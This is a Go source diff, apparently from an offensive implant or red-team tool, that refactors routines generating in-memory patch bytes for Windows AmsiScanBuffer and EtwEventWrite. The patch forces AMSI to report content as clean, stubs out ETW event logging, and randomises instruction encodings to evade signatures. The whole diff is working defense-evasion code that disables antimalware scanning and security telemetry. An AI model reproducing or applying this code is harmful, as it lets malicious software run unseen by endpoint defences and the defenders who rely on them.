@@ -54,33 +54,51 @@ func jitter(min, max time.Duration) {
 	time.Sleep(d)
 }
 
-func randomPatchBytes() []byte {
+func randomZeroReg() []byte {
 	zeroReg := [][]byte{
 		{0x33, 0xC0},       // xor eax, eax
 		{0x31, 0xC0},       // xor eax, eax (alternative encoding)
 		{0x29, 0xC0},       // sub eax, eax
 		{0x48, 0x31, 0xC0}, // xor rax, rax
 	}
-	reg := zeroReg[mrand.Intn(len(zeroReg))]
-	patch := make([]byte, patchLen)
+	return zeroReg[mrand.Intn(len(zeroReg))]
+}
 
-	// On x64, R9 holds the 5th argument (the AMSI_RESULT *result out-
-	// parameter for AmsiScanBuffer). Write 0 to *R9 so the caller sees
-	// AMSI_RESULT_CLEAN.  C7 01 00 00 00 00 = mov dword ptr [rcx], 0
-	// — but R9 is the out-param, not RCX.  Use R9 directly:
-	//   41 C7 01 00 00 00 00  =  mov dword ptr [r9], 0
+// randomAmsiPatchBytes generates a patch for AmsiScanBuffer.
+// AmsiScanBuffer has 5 parameters; on x64 the 5th (AMSI_RESULT *result)
+// arrives in R9. The patch writes 0 to *R9 (AMSI_RESULT_CLEAN), zeros
+// EAX (HRESULT = S_OK), and returns.
+func randomAmsiPatchBytes() []byte {
+	reg := randomZeroReg()
+	patch := make([]byte, patchLen)
+	// mov dword ptr [r9], 0  — write AMSI_RESULT_CLEAN to the out-param
 	patch[0] = 0x41
 	patch[1] = 0xC7
 	patch[2] = 0x01
 	// bytes 3..6 = 0 (immediate dword 0)
-
 	off := 7
 	copy(patch[off:], reg)
 	off += len(reg)
-	patch[off] = 0xC3 // ret
+	patch[off] = 0xC3
 	off++
 	for i := off; i < patchLen; i++ {
-		patch[i] = 0xCC // int3 padding
+		patch[i] = 0xCC
+	}
+	return patch
+}
+
+// randomEtwPatchBytes generates a patch for EtwEventWrite.
+// EtwEventWrite has 4 parameters; R9 holds PEVENT_DATA_DESCRIPTOR
+// UserData — a pointer to event data, NOT an output result. The patch
+// must NOT write through R9. It only zeros EAX (ULONG return = 0 =
+// ERROR_SUCCESS) and returns.
+func randomEtwPatchBytes() []byte {
+	reg := randomZeroReg()
+	patch := make([]byte, patchLen)
+	copy(patch, reg)
+	patch[len(reg)] = 0xC3
+	for i := len(reg) + 1; i < patchLen; i++ {
+		patch[i] = 0xCC
 	}
 	return patch
 }
